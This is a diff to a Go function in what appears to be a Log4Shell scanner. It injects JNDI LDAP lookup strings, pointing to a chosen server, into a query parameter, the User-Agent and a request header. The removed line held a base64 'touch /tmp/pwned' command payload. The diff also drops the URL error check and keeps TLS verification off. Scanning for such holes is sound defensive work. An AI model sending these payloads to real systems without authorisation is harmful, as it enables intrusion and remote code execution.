@@ -16,29 +16,26 @@ import (
 
 func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
 	defer wg.Done()
+	const timeoutInterval = 2
 
 	client := &http.Client{
-		Timeout: 5 * time.Second,
+		Timeout: 2 * timeoutInterval * time.Second,
 		Transport: &http.Transport{
-			TLSHandshakeTimeout:   5 * time.Second,
-			ResponseHeaderTimeout: 5 * time.Second,
-			ExpectContinueTimeout: 5 * time.Second,
+			TLSHandshakeTimeout:   timeoutInterval * time.Second,
+			ResponseHeaderTimeout: timeoutInterval * time.Second,
+			ExpectContinueTimeout: timeoutInterval * time.Second,
 			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
 		},
 	}
 
 	log.Debugf("Target URL: %s", hostUrl)
 	baseUrl, err := url.Parse(hostUrl)
-	if err != nil {
-		pterm.Error.Printf("Bad URL: %s", hostUrl)
-		log.Fatal(err)
-	}
-	//baseUrl.Path += "/${jndi:ldap://%s/exploit.class}"
+	param := url.Values{}
+	param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, "test"))
+	baseUrl.RawQuery = param.Encode()
 	targetUrl := baseUrl.String()
-	//targetUrl := fmt.Sprintf("%s/${jndi:ldap://%s/exploit.class}", hostUrl, serverUrl)
-	//targetUrl := hostUrl
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
-	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
+	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/Y29udGFjdEBwcm9mZXJvLmlv}", serverUrl)
 	//log.Debugf("Target User-Agent: %s", targetUserAgent)
 	//log.Debugf("Target X-Api-Version: %s", targetHeader)
 	request, err := http.NewRequest("GET", targetUrl, nil)
